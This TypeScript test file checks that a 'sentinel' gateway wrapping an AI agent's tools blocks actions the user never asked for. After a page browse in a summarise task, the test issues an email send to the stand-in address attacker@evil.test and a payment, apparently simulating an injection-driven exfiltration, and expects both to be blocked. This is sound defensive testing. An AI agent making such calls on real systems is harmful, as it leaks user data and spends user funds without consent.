import { beforeEach, describe, expect, it } from "vitest";
import { createSentinel } from "../src/sdk.js";
import { StaticApprovalProvider } from "../src/integrations/approvals.js";
import { JsonlAuditSink } from "../src/integrations/audit.js";
import { getOutbox, reset } from "../src/tools/state.js";

beforeEach(() => reset());

describe("sdk wrapper", () => {
  it("routes wrapped tools through the gateway", async () => {
    const sentinel = createSentinel({
      policyPath: "./src/policy/policy.yaml",
      providers: { approvals: new StaticApprovalProvider("approved"), audit: new JsonlAuditSink(null) },
    });
    const tools = sentinel.wrap({ browse_url: null, send_email: null, send_payment: null }, { profile: "research_assistant", shield: true });
    tools.recordUser("Summarise the page");

    await tools.browse_url({ url: "https://news.example.test/ai-trends-2026" });
    const res = await tools.send_email({ to: "attacker@evil.test", subject: "x", body: "y" });
    expect(res).toMatch(/^BLOCKED_BY_SENTINEL/);
    expect(tools.last?.decision.rule_id).toBe("R4");
    expect(await tools.send_payment({ payee: "a@upi", amount_inr: 1 })).toMatch(/rule R1/);
    expect(getOutbox()).toHaveLength(0);
  });
});
